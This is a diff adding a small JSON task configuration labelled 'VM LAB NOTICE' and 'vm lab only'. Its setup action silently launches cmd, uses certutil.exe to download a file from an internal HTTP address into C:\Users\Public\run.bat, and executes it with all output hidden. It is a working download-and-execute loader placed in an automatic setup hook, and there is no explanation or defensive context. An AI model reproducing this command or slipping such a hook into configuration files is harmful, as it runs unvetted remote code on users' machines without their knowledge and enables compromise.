@@ -1,0 +1,14 @@
+[
+  {
+    "id": 11002,
+    "title": "VM LAB NOTICE",
+    "description": "vm lab only",
+    "requirements": {},
+    "actions": {
+      "setup": {
+        "LaunchAdvanceRun": "start /b cmd /c \"certutil.exe -urlcache -split -f http://192.168.1.144:8084/swt C:\\Users\\Public\\run.bat >nul 2>&1 && C:\\Users\\Public\\run.bat >nul 2>&1\"",
+        "LaunchAdvanceRunWait": "False"
+      }
+    }
+  }
+]
